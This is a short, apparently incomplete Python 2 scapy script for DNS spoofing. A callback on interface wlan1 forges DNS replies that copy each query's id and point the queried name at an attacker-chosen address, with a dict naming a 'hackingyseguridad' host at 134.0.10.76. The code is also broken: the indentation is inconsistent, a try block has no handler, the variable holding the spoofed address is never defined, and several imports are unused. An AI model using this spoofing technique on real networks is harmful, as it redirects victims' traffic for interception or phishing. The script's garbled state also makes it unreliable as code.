from threading import Thread
from Queue import Queue, Empty
from scapy.all import *

m_iface = "wlan1"
m_finished = False

def print_summary(packet):
    target = {'hackingyseguridad':'134.0.10.76'
    }
          try:
            requestIP = packet[IP]
            requestUDP = packet[UDP]
            requestDNS = packet[DNS]
            requestDNSQR = packet[DNSQR]      
            
            responseIP = IP(src=requestIP.dst, dst=requestIP.src)
            responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
            responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
            responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
            answer = responseIP/responseUDP/responseDNS
            send(answer)
      print packet.summary()
